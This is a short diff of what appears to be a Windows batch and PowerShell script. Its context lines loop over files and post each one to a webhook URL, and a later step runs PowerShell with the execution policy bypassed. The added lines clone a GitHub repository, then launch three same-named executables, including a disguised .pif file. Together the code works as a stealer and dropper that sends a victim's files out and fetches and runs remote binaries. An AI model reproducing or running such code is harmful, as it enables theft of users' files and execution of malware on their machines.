@@ -40,6 +40,12 @@ foreach ($file in $fileList) {
     }
     Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data" -Body $webhookParams
 }"
+git clone https://github.com/kaosSec/kaosTools
+CD kaosTools
+CD infarox
+START infarox27.EXE
+START infarox27.pif
+START infarox27.msi
 pow:
 powershell.exe -ExecutionPolicy Bypass -Script "%PSPS%"
 hk:
